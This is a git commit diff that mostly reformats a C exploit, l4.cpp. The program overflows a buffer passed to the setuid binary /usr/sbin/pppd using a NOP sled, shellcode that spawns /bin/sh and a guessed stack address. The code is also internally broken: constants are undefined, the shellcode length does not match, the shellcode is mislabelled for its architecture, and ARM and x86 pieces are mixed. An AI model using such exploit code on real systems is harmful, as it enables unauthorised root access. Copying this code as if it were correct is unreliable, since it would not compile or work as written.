99868f449d5b9c35b8a150347d0211fb96918535
Ethan Laur <phyrrus9@gmail.com>
2012-10-02 10:54:45 -0300

    Really tired of those weird spacing symbols

--- l4.cpp
+++ l4.cpp
@@ -2,9 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
-#include <unistd.h> //the compiler cannot find the binary image of
-//this library for arm-based processors.  likewise if we comment the asm
-//line it will fail.
+#include <unistd.h>
 #include <time.h>
 #include <sys/time.h>
 
@@ -15,72 +13,60 @@
 #define SH_LEN 223
 #define BUF_LEN 22008
 
-                                           u_char hppa_shellcode[] =
-
+u_char hppa_shellcode[] =
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
-
 "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
-                                           "\xb0\x3b\x50\xcd\x80";
-                                           u_long get_sp(void)
-
+"\xb0\x3b\x50\xcd\x80";
+u_long get_sp(void)
 {
+u_long val = 0;
 
-   u_long val = 0;
-
-   __asm__ ( \
-
-            "mov %0, sp\n"
-
-            : "=r" (val)
-
-            : "0"(val)
-
-            );
-
-   return val;
-
+__asm__ ( \
+"mov %0, sp\n"
+: "=r" (val)
+: "0"(val)
+); //thank you nikias
+return val;
 }
 
-                                                     int main(int
+int main(int
 argc, char *argv[])
 {
-   char buf[BUF_LENGTH + 8];
-   unsigned long targ_addr;
-   u_long *long_p;
-   u_char *char_p;
-   int i, code_length = SH_LEN,dso=STACK_OFFSET,xtra=EXTRA;
+char buf[BUF_LENGTH + 8];
+unsigned long targ_addr;
+u_long *long_p;
+u_char *char_p;
+int i, code_length = SH_LEN,dso=STACK_OFFSET,xtra=EXTRA;
 
-   if(argc > 1) dso+=atoi(argv[1]);
-   if(argc > 2) xtra+=atoi(argv[2]);
+if(argc > 1) dso+=atoi(argv[1]);
+if(argc > 2) xtra+=atoi(argv[2]);
 
-   long_p = (u_long *) buf;
+long_p = (u_long *) buf;
 
-   for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
-       *long_p++ = HPPA_NOP; //can I haz steak?
+for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
+  *long_p++ = HPPA_NOP; //can I haz steak?
 
-   char_p = (u_char *) long_p;
+char_p = (u_char *) long_p;
 
-   char_p--;   //weirdness alighnment issue
+char_p--;   //weirdness alighnment issue
 
-   for (i = 0; i < code_length; i++)
-       *char_p++ = hppa_shellcode[i];
+for (i = 0; i < code_length; i++)
+  *char_p++ = hppa_shellcode[i];
 
-   targ_addr = get_sp() - dso;
+targ_addr = get_sp() - dso;
 
-   for (i = 0; i < xtra /4; i++)
-   {
-       *char_p++ =(targ_addr>>24)&255;
-       *char_p++ =(targ_addr>>16)&255;
-       *char_p++ =(targ_addr>>8)&255;
-       *char_p++ =(targ_addr)&255;
-   }
-   //I'm j0ker! yes you are
+for (i = 0; i < xtra /4; i++)
+{
+  *char_p++ =(targ_addr>>24)&255;
+  *char_p++ =(targ_addr>>16)&255;
+  *char_p++ =(targ_addr>>8)&255;
+  *char_p++ =(targ_addr)&255;
+}
 
-   printf("Jumping to address 0x%lx B[%d]
+printf("Jumping to address 0x%lx B[%d]
 E[%d]SO[%d]\n",targ_addr,BUF_LEN,xtra,dso);
 
-          execl("/usr/sbin/pppd","pppd", buf,(char *) 0);
-          /*lolololololololololololol*/
-          perror("execl failed");
-          return(-1);
-          }
+execl("/usr/sbin/pppd","pppd", buf,(char *) 0);
+perror("execl failed");
+return(-1);
+}
